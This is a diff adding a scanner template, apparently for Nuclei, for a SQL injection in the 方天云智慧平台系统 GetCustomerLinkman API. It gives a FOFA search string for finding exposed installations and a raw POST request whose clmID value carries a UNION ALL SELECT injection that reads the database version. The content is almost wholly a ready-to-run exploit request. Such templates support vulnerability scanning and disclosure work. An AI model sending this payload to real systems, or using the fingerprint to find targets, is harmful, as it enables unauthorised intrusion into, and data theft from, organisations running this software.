@@ -1,0 +1,27 @@
+id: poc-bfnf0tsg4gxg0543
+info:
+  name: 方天云智慧平台系统 GetCustomerLinkman SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bfnf0tsg4gxg0543'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bfnf0tsg4gxg0543
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+http:
+- raw:
+  - 'POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    Content-Type: application/json
+
+    {clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
